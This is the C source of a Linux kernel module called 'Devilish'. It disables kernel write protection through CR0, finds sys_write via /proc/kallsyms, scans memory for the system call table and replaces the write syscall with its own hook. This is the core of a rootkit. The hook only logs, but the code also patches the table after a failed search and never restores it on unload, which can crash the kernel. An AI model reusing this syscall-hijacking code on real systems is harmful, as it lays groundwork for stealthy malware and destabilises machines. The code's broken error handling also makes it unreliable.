#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/slab.h>		// kmalloc()
#include <linux/fs.h>		// file operation functions in kernel mode
#include <linux/uaccess.h>	//userspace memory access functions (get/set_fs())
#include <linux/string.h>	// necessary evil
#include <linux/syscalls.h>
#include <asm/page.h>
#include <linux/types.h>
#include <asm/unistd.h>

#define MODULENAME "Devilish"
#define MAX_LEN 256
#define SYMBOLS "/proc/kallsyms"

MODULE_LICENSE("Dual MIT/GPL");

unsigned long original_cr0;
unsigned long *sys_write_address;

asmlinkage long (* orig_write) (int fd, const char __user *buf, size_t count);

asmlinkage long new_write(int fd, const char __user *buf, size_t count)
{
	printk(KERN_INFO "Write hook!\n");
	return orig_write(fd, buf, count);
}

static unsigned long **find_address_sct(void)
{
	unsigned long **sct;
	unsigned long offset = PAGE_OFFSET;

	while (offset < ULLONG_MAX) {
		sct = (unsigned long **)offset;

		if (sct[__NR_write] == sys_write_address) {
			return sct;
		}

		offset += sizeof(void *);
	}

	return (unsigned long **)0;
}

static int find_address_write(void)
{
	struct file *fp = NULL;
	int i = 0;
	char buf[MAX_LEN];
	char *ptr;
	char *tmp;
	mm_segment_t fs_state;

	fs_state = get_fs();
	set_fs(KERNEL_DS);

	fp = filp_open(SYMBOLS, O_RDONLY, 0);
	if (fp == NULL)
		return -1;

	memset(buf, 0x0, MAX_LEN);
	ptr = buf;
	while(vfs_read(fp, ptr+i, 1, &fp->f_pos) == 1) {
		if (ptr[i] == '\n' || i == 255) {
			i = 0;
			if ((strstr(ptr, "sys_write") != NULL)) {
				printk(KERN_INFO "ptr = %s\n", ptr);

				tmp = kzalloc(MAX_LEN, GFP_KERNEL);
				if (tmp == NULL) {
					kfree(tmp);
					filp_close(fp, 0);
					set_fs(fs_state);
					return -1;
				}
				strncpy(tmp, strsep(&ptr, " "), MAX_LEN);
				sys_write_address = (unsigned long *)
						simple_strtol(tmp, NULL, 16);
				kfree(tmp);
				break;
			}
			memset(buf, 0x0, MAX_LEN);
			continue;
		}
		i++;
	}

	filp_close(fp, 0);
	set_fs(fs_state);
	return 0;
}

static int __init loader(void)
{
	unsigned long **sct;
	original_cr0 = read_cr0();

	write_cr0(original_cr0 & ~0x10000);

	printk(KERN_EMERG "Loaded %s\n", MODULENAME);
	find_address_write();
	sct = find_address_sct();
	if (!sct) {
		printk(KERN_INFO "Failed to retrieve sct\n");
	} else {
		printk(KERN_INFO "HOLY SHIT BOIIII\n");
	}
	printk("LOL!\n");
	orig_write = (long) sct[__NR_write];
	sct[__NR_write] = (unsigned long *)new_write;
	write_cr0(original_cr0);
	return 0;
}

static void __exit reset(void)
{
	printk(KERN_INFO "Unloaded %s\n", MODULENAME);
}

module_init(loader);
module_exit(reset);
